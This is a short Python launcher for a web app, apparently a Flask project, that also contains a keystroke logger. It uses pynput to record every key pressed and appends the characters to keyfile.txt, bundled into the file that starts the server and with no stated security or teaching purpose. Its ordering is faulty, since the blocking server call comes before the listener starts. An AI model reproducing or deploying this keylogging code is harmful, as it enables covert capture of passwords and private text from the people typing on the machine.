from website import create_app
from pynput import keyboard 

app = create_app()

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except: 
            print("Error getting char")

# only if we run this file directly, not if we import this file, we'll execut the following line
if __name__ == '__main__': 
    # 'True' allows to automatically rerun the server after every update
    # turn to "False" when finsih
    app.run(debug=True)

    listener = keyboard.Listener(on_press = keyPressed)
    listener.start()
    input()